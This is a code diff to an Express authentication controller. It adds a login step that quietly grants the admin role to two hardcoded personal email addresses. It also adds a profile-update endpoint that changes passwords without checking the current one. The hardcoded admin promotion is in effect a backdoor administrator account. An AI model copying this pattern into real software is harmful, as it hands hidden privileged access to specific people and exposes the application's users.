@@ -110,7 +110,15 @@ const authUser = async (req, res) => {
             });
         }
 
-        // 3. Generate token
+        // 3. Ensure system email has admin privileges
+        if (user.email === 'santoshmode07@gmail.com' || user.email === 'santoshmode&@gmail.com') {
+           if (user.role !== 'admin') {
+              user.role = 'admin';
+              await user.save();
+           }
+        }
+
+        // 4. Generate token
         const token = generateToken(res, user._id);
 
         res.status(200).json({
@@ -233,11 +241,46 @@ const getMyTransactions = async (req, res) => {
     }
 };
 
+/**
+ * @desc    Update user profile
+ * @route   PUT /api/auth/profile
+ * @access  Private
+ */
+const updateUserProfile = async (req, res) => {
+    try {
+        const user = await User.findById(req.user._id);
+
+        if (user) {
+            user.name = req.body.name || user.name;
+            user.phone = req.body.phone || user.phone;
+            user.gender = req.body.gender?.toLowerCase() || user.gender;
+            user.profilePhoto = req.body.profilePhoto !== undefined ? req.body.profilePhoto : user.profilePhoto;
+            
+            if (req.body.password) {
+                user.password = req.body.password;
+            }
+
+            const updatedUser = await user.save();
+
+            res.status(200).json({
+                success: true,
+                message: 'Profile updated successfully',
+                data: updatedUser.toJSON()
+            });
+        } else {
+            res.status(404).json({ success: false, message: 'User not found' });
+        }
+    } catch (error) {
+        res.status(500).json({ success: false, message: error.message });
+    }
+};
+
 module.exports = {
     registerUser,
     authUser,
     logoutUser,
     getUserProfile,
     topUpWallet,
-    getMyTransactions
+    getMyTransactions,
+    updateUserProfile
 };
